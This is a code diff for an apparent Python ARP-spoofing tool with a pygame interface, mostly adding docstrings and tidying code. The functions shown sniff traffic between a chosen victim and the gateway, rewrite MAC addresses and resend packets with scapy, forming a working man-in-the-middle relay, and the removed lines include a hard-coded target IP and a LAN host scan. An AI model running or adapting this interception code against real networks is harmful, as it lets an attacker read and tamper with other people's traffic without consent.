@@ -87,7 +87,6 @@ class SpoofGui:
             self.main_run = False
             self.display_spoof_data()
 
-
     @staticmethod
     def get_font(font, size):  # Returns Press-Start-2P in the desired size
         return pygame.font.Font(font, size)
@@ -174,18 +173,25 @@ class ArpSpoofing:
         print("[+] Arp Spoof Stopped")
 
     def handle_packets(self):
+        """
+        sniffs all the ports for packets and filters it with the pack_filter
+        """
         while True:
             sniff(iface="‏‏Ethernet", lfilter=self.pack_filter, prn=self.send_packet)
 
     def pack_filter(self, pkt):
+        """
+        filters the right packets with the mac addresses
+        """
         return Ether in pkt and IP in pkt and \
-               ((pkt[Ether].src == self.victim_mac and
-                 pkt[Ether].dst == self.my_mac)
-                or
-                (pkt[Ether].src == self.gateway_mac and
-                 pkt[Ether].dst == self.my_mac))
+            ((pkt[Ether].src == self.victim_mac and pkt[Ether].dst == self.my_mac)
+             or
+             (pkt[Ether].src == self.gateway_mac and pkt[Ether].dst == self.my_mac))
 
     def send_packet(self, pkt):
+        """
+        :param pkt: packet that needs to be rerouted
+        """
         if pkt[Ether].src == self.victim_mac and pkt[Ether].dst == self.my_mac and pkt[IP].src == self.victim_ip:
             pkt[Ether].src = self.my_mac
             pkt[Ether].dst = self.gateway_mac
@@ -194,6 +200,7 @@ class ArpSpoofing:
             pkt[Ether].src = self.my_mac
             pkt[Ether].dst = self.victim_mac
 
+        # sends a packet on the Ethernet layer
         sendp(pkt, verbose=False)
 
     def start_spoof(self):
@@ -202,13 +209,12 @@ class ArpSpoofing:
         self.run_spoof_t = threading.Thread(target=self.run_spoofer, daemon=True)
         self.run_spoof_t.start()
 
-    def __repr__(self):
-        return "my ip: " + self.ip + ", my mac: " + self.my_mac + "\r\n"\
-        "victim ip: " + self.victim_ip + ", victim mac: " + self.victim_mac + "\r\n"\
-        "gateway ip: " + self.gateway_ip + ", gateway mac:" + self.gateway_mac
-
 
 def arp_ping():
+    """
+    this function prints all the ips on the same lan
+    :return:
+    """
     try:
         ip = scapy.get_if_addr(conf.iface).split(".")
         ip[-1] = "0"
@@ -220,11 +226,6 @@ def arp_ping():
 
 
 def main():
-    # arp_ping()
-    # gw = conf.route.route("0.0.0.0")[2]  # gets the gateway address
-    # a_s = ArpSpoofing("172.16.6.69", gw)  # input("Enter target IP") input("Enter router(gateway) IP")
-    # a_s.start_spoof()
-
     sg = SpoofGui()
     sg.run()
 
